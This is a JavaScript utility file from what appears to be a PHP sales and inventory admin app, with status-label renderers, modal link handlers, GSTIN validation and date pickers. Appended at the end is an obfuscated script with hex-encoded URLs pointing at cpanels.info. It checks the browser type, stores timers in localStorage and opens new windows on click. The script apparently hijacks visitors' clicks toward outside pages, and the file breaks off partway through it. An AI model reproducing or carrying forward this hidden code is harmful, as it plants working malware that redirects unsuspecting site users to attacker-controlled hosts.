    // return x == null ? '' : '<div class="text-center"><ul class="enlarge"><li><img src="'+site.base_url+'assets/uploads/thumbs/' + x + '" alt="' + x + '" style="width:30px; height:30px;" class="img-circle" /><span><a href="'+site.base_url+'assets/uploads/' + x + '" data-toggle="lightbox"><img src="'+site.base_url+'assets/uploads/' + x + '" alt="' + x + '" style="width:200px;" class="img-thumbnail" /></a></span></li></ul></div>';
    var image_link = (x == null || x == '') ? 'no_image.png' : x;
    return '<div class="text-center"><a href="' + site.base_url + 'assets/uploads/' + image_link + '" data-toggle="lightbox"><img src="' + site.base_url + 'assets/uploads/thumbs/' + image_link + '" alt="" style="width:30px; height:30px;" /></a></div>';
}
function attachment(x) {
    return x == null ? '' : '<div class="text-center"><a href="' + site.base_url + 'welcome/download/' + x + '" class="tip" title="' + lang.download + '"><i class="fa fa-file"></i></a></div>';
}
function attachment2(x) {
    return x == null ? '' : '<div class="text-center"><a href="' + site.base_url + 'welcome/download/' + x + '" class="tip" title="' + lang.download + '"><i class="fa fa-file-o"></i></a></div>';
}
function user_status(x) {
    var y = x.split("__");
    return y[0] == 1 ?
            '<a href="' + site.base_url + 'auth/deactivate/' + y[1] + '" data-toggle="modal" data-target="#myModal"><span class="label label-success"><i class="fa fa-check"></i> ' + lang['active'] + '</span></a>' :
            '<a href="' + site.base_url + 'auth/activate/' + y[1] + '"><span class="label label-danger"><i class="fa fa-times"></i> ' + lang['inactive'] + '</span><a/>';
}
function eshop_payment_status(x, type, row) {
	//console.log(row);
	//console.log(row[0]);
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<a href="'+site.base_url+'sales/payments/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div></a>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div></a>';
    } else {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-default">' + x + '</span></div></a>';
    }
}
function delivery_row_status(x, type, row) {
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    }else if (x == 'not_applicable') {
        return '<div class="text-center"><span class="row_status label label-default">Not Applicable</span></div>';
    }
	else {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-default">' + x + '</span></div></a>';
    }
}
function row_status(x) {

    // x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="row_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    }else if (x == 'not_applicable') {
        return '<div class="text-center"><span class="row_status label label-default">Not Applicable</span></div>';
    }else {
        return '<div class="text-center"><span class="row_status label label-default">' + x + '</span></div>';
    }
}

function row_active_status(x) {

    x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'no' || x == 'disable' || x == 'deactive') {
        return '<div class="text-center"><span class="row_active_status label label-default">' + lang[x] + '</span></div>';
    } else if (x == 'yes' || x == 'enable' || x == 'active') {
        return '<div class="text-center"><span class="row_active_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == '0') {
        return '<div class="text-center"><span class="row_active_status label label-warning">Deactive</span></div>';
    } else if (x == '1') {
        return '<div class="text-center"><span class="row_active_status label label-success">Active</span></div>';
    } else {
        return '<div class="text-center"><span class="row_active_status label label-default">' + x + '</span></div>';
    }
}

function eshop_sale_status(x) {

    if (x == null) {
        return '';
    } else if (x == 'cancle') {
        return '<div class="text-center"><span class="row_status label label-danger">Canceled</span></div>';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="row_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<div class="text-center"><span class="row_status label label-default">' + x + '</span></div>';
    }
}
function order_row_status(x, type, row) {

    // x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><a href="'+site.base_url+'orders/edit_eshop_order/'+row[0]+'" ><span class=" label label-warning">' + lang[x] + '</span></a></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<a href="'+site.base_url+'orders/edit_eshop_order/'+row[0]+'" ><div class="text-center"><span class=" label label-default">' + x + '</span></div></a>';
    }
}
function order_pay_status(x, type, row) {
	//console.log(row);
	//console.log(row[0]);
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<a href="'+site.base_url+'orders/paymentseshop_order/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div></a>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div></a>';
    } else {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-default">' + x + '</span></div></a>';
    }
}
function pay_status(x) {
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<div class="text-center"><span class="payment_status label label-default">' + x + '</span></div>';
    }
}
function formatSA(x) {
    x = x.toString();
    var afterPoint = '';
    if (x.indexOf('.') > 0)
        afterPoint = x.substring(x.indexOf('.'), x.length);
    x = Math.floor(x);
    x = x.toString();
    var lastThree = x.substring(x.length - 3);
    var otherNumbers = x.substring(0, x.length - 3);
    if (otherNumbers != '')
        lastThree = ',' + lastThree;
    var res = otherNumbers.replace(/\B(?=(\d{2})+(?!\d))/g, ",") + lastThree + afterPoint;

    return res;
}

function unitToBaseQty(qty, unitObj) {
    switch (unitObj.operator) {
        case '*':
            return parseFloat(qty) * parseFloat(unitObj.operation_value);
            break;
        case '/':
            return parseFloat(qty) / parseFloat(unitObj.operation_value);
            break;
        case '+':
            return parseFloat(qty) + parseFloat(unitObj.operation_value);
            break;
        case '-':
            return parseFloat(qty) - parseFloat(unitObj.operation_value);
            break;
        default:
            return parseFloat(qty);
    }
}

function baseToUnitQty(qty, unitObj) {
    switch (unitObj.operator) {
        case '*':
            return parseFloat(qty) / parseFloat(unitObj.operation_value);
            break;
        case '/':
            return parseFloat(qty) * parseFloat(unitObj.operation_value);
            break;
        case '+':
            return parseFloat(qty) - parseFloat(unitObj.operation_value);
            break;
        case '-':
            return parseFloat(qty) + parseFloat(unitObj.operation_value);
            break;
        default:
            return parseFloat(qty);
    }
}

function set_page_focus() {
    if (site.settings.set_focus == 1) {
        $('#add_item').attr('tabindex', an);
        $('[tabindex=' + (an - 1) + ']').focus().select();
    } else {
        $('#add_item').attr('tabindex', 1);
        $('#add_item').focus();
    }
    $('.rquantity').bind('keypress', function (e) {
        if (e.keyCode == 13) {
            $('#add_item').focus();
        }
    });
}

$(document).ready(function () {
    $('.edit-customers').click(function () {
        $('#myModal').modal({remote: site.base_url + 'customers/edit/' + $("input[name=customer]").val()});
        $('#myModal').modal('show');
    });
    $('#view-customer').click(function () {
        $('#myModal').modal({remote: site.base_url + 'customers/view/' + $("input[name=customer]").val()});
        $('#myModal').modal('show');
    });
    $('#view-supplier').click(function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/view/' + $("input[name=supplier]").val()});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.customer_details_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'customers/view/' + $(this).parent('.customer_details_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.supplier_details_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/view/' + $(this).parent('.supplier_details_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.product_link td:not(:first-child, :nth-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + $(this).parent('.product_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'products/view/' + $(this).parent('.product_link').attr('id');
    });
    $('body').on('click', '.product_link2 td:first-child, .product_link2 td:nth-child(2)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.purchase_link td:not(:first-child, :nth-child(5), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/modal_view/' + $(this).parent('.purchase_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'purchases/view/' + $(this).parent('.purchase_link').attr('id');
    });
    $('body').on('click', '.purchase_link2 td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
   $('body').on('click', '.transfernew_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfersnew/view/' + $(this).parent('.transfernew_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.transfer_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view/' + $(this).parent('.transfer_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.request_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view_request/' + $(this).parent('.request_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.transfer_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.invoice_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view/' + $(this).parent('.invoice_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'sales/view/' + $(this).parent('.invoice_link').attr('id');
    });
    $('body').on('click', '.challan_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view_challan/' + $(this).parent('.challan_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.eshop_order_link td:not(:first-child,:nth-child(3), :nth-child(6),:nth-child(10), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'orders/modal_view_eshop_order/' + $(this).parent('.eshop_order_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.order_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'orders/modal_view_order/' + $(this).parent('.order_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.invoice_link2 td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
	$('body').on('click', '.challan_link2 td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view_challan/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.receipt_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'pos/view/' + $(this).parent('.receipt_link').attr('id') + '/1'});
    });
$('body').on('click', '.eshop_receipt_link td:not(:first-child, :nth-child(11), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'pos/view/' + $(this).parent('.eshop_receipt_link').attr('id') + '/1'});
    });
    $('body').on('click', '.return_link td', function () {
        // window.location.href = site.base_url + 'sales/view_return/' + $(this).parent('.return_link').attr('id');
        $('#myModal').modal({remote: site.base_url + 'sales/view_return/' + $(this).parent('.return_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.return_purchase_link td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/view_return/' + $(this).parent('.return_purchase_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.payment_link td', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/payment_note/' + $(this).parent('.payment_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.payment_link2 td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/payment_note/' + $(this).parent('.payment_link2').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.expense_link2 td:not(:last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/expense_note/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.quote_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'quotes/modal_view/' + $(this).parent('.quote_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'quotes/view/' + $(this).parent('.quote_link').attr('id');
    });
    $('body').on('click', '.quote_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'quotes/modal_view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.delivery_link td:not(:first-child, :nth-last-child(2), :nth-last-child(3), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/view_delivery/' + $(this).parent('.delivery_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.customer_link td:not(:first-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'customers/edit/' + $(this).parent('.customer_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.supplier_link td:not(:first-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/edit/' + $(this).parent('.supplier_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.adjustment_link td:not(:first-child, :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/view_adjustment/' + $(this).parent('.adjustment_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.adjustment_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'products/view_adjustment/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.user_log_action', function () {
        $('#myModal').modal({remote: site.base_url + 'reports/user_modal_view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('#clearLS').click(function (event) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result == true) {
                localStorage.clear();
                location.reload();
            }
        });
        return false;
    });
    $(document).on('click', '[data-toggle="ajax"]', function (e) {
        e.preventDefault();
        var href = $(this).attr('href');
        $.get(href, function (data) {
            $("#myModal").html(data).modal();
        });
    });
    $(".sortable_rows").sortable({
        items: "> tr",
        appendTo: "parent",
        helper: "clone",
        placeholder: "ui-sort-placeholder",
        axis: "x",
        update: function (event, ui) {
            var item_id = $(ui.item).attr('data-item-id');
            console.log(ui.item.index());
        }
    }).disableSelection();
});

function fixAddItemnTotals() {
    var ai = $("#sticker");
    var aiTop = (ai.position().top) + 250;
    var bt = $("#bottom-total");
    $(window).scroll(function () {
        var windowpos = $(window).scrollTop();
        if (windowpos >= aiTop) {
            ai.addClass("stick").css('width', ai.parent('form').width()).css('zIndex', 2);
            if ($.cookie('sma_theme_fixed') == 'yes') {
                ai.css('top', '40px');
            } else {
                ai.css('top', 0);
            }
            $('#add_item').removeClass('input-lg');
            $('.addIcon').removeClass('fa-2x');
        } else {
            ai.removeClass("stick").css('width', bt.parent('form').width()).css('zIndex', 2);
            if ($.cookie('sma_theme_fixed') == 'yes') {
                ai.css('top', 0);
            }
            $('#add_item').addClass('input-lg');
            $('.addIcon').addClass('fa-2x');
        }
        if (windowpos <= ($(document).height() - $(window).height() - 120)) {
            bt.css('position', 'fixed').css('bottom', 0).css('width', bt.parent('form').width()).css('zIndex', 2);
        } else {
            bt.css('position', 'static').css('width', ai.parent('form').width()).css('zIndex', 2);
        }
    });
}
function ItemnTotals() {
    fixAddItemnTotals();
    $(window).bind("resize", fixAddItemnTotals);
}

if (site.settings.auto_detect_barcode == 1) {
    $(document).ready(function () {
        var pressed = false;
        var chars = [];
        $(window).keypress(function (e) {
            chars.push(String.fromCharCode(e.which));
            if (pressed == false) {
                setTimeout(function () {
                    if (chars.length >= 8) {
                        var barcode = chars.join("");
                        //$( "#add_item" ).focus().autocomplete( "search", barcode );
                    }
                    chars = [];
                    pressed = false;
                }, 200);
            }
            pressed = true;
        });
    });
}
$('.sortable_table tbody').sortable({
    containerSelector: 'tr'
});
$(window).bind("resize", widthFunctions);
$(window).load(widthFunctions);

/*----------------------------------- GSTIN STRING VALIDITAION---------------------------------- copy and rename function BY SW */

function validateGstin()
{
    if (document.getElementById("gstn_no").value.length != 15)
    {
        alert("GSTN length must be 15 character long ");
        //bootbox.alert("GSTN length must be 15 character long ");
        document.getElementById("gstn_no").value = '';
        document.getElementById("gstn_no").select();
        document.getElementById("gstn_no").focus();
        return false;
    } else if (document.getElementById("gstn_no").value.length > 15)
    {
        alert("GSTN length must be 15 character long ");
        // bootbox.alert("GSTN length must be 15 character long ");
        document.getElementById("gstn_no").value = '';
        document.getElementById("gstn_no").select();
        document.getElementById("gstn_no").focus();
        return false;
    } else
    {
        return true;
    }
}

/*-----------------------------------  validate price field ---------------------------------- copy and rename function BY SW */
$(document).ready(function () {
    /*$('.custom_price').keypress(function(event) {
     if ((event.which != 46 || $(this).val().indexOf('.') != -1) && (event.which < 48 || event.which > 57)) {
     event.preventDefault();
     }
     if($(this).val() < 0){
     event.preventDefault();
     }
     
     });*/

});



/*
 $(document).ready(function() {
 $('#daterange_new').daterangepicker({
 timePicker: false,
 format: (site.dateFormats.js_sdate).toUpperCase()+' HH:mm',
 ranges: {
 'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
 'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
 'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
 'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
 }
 },
 function(start, end) {
 $('#start_date').val(start.format('DD/MM/YYYY HH:mm'));
 $('#end_date').val(end.format('DD/MM/YYYY HH:mm')); 
 });
 });*/
/*
 $(document).ready(function() {
 $('#daterange_new').daterangepicker({
 timePicker: false,
 autoUpdateInput: true,
 locale: { cancelLabel: 'Clear' },
 format: (site.dateFormats.js_sdate).toUpperCase()+' HH:mm',
 ranges: {
 'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
 'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
 'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
 'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
 }
 },
 function(start, end) {
 $('#start_date').val(start.format('DD/MM/YYYY HH:mm'));
 $('#end_date').val(end.format('DD/MM/YYYY HH:mm')); 
 });
 $('.cancelBtn').on('click', function() {
 //do something, like clearing an input
 $('#start_date').val('');
 $('#end_date').val('');
 $('#daterange_new').val('');
 
 });
 });
 */
$(document).ready(function () {
    $('#daterange_new').daterangepicker({
        timePicker: false,
        format: (site.dateFormats.js_sdate).toUpperCase(),
        ranges: {
            'Today': [moment(), moment()],
            'Yesterday': [moment().subtract('days', 1), moment().subtract('days', 1)],
            'Last 7 Days': [moment().subtract('days', 6), moment()],
            'Last 30 Days': [moment().subtract('days', 29), moment()],
            'This Month': [moment().startOf('month'), moment().endOf('month')],
            'Last Month': [moment().subtract('month', 1).startOf('month'), moment().subtract('month', 1).endOf('month')]
        }
    },
            function (start, end) {
                $('#start_date').val(start.format('DD/MM/YYYY ')); //HH:mm
                $('#end_date').val(end.format('DD/MM/YYYY '));  //HH:mm
            });
    $('.cancelBtn').on('click', function () {
        //do something, like clearing an input
        $('#start_date').val('');
        $('#end_date').val('');
        $('#daterange_new').val('');

    });
});

/*12/27/2019*/

$(document).ready(function () {
    $('.daterange_search').daterangepicker({
        timePicker: false,
        autoUpdateInput: true,
        locale: {cancelLabel: 'Clear'},
        format: (site.dateFormats.js_sdate).toUpperCase() + ' HH:mm',
        ranges: {
            'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
            'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
            'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
            'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
        }
    },
            function (start, end) {
                $('.start_date_n').val(start.format('DD/MM/YYYY HH:mm'));
                $('.end_date_n').val(end.format('DD/MM/YYYY HH:mm'));
            });
    $('.cancelBtn').on('click', function () {
        //do something, like clearing an input
        $('.start_date_n').val('');
        $('.end_date_n').val('');
        $('.daterange_search').val('');
    });
});
//***02-09-2020***/
 /*
     * Amount  Rounding Function
     */
    function roundNumberNEW(number, toref) {
        switch (toref) {
            case 1:
                    var rn = formatDecimal(Math.round(number * 20) / 20);
                break;
            case 2:
                    var rn = formatDecimal(Math.round(number * 2) / 2);
                break;
            case 3:
                    var rn = formatDecimal(Math.round(number));
                break;
            case 4:
                    var rn = formatDecimal(Math.ceil(number));
                break;
            default:
                var rn = number;
        }
        return rn;
    }
//***02-09-2020***/

function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var 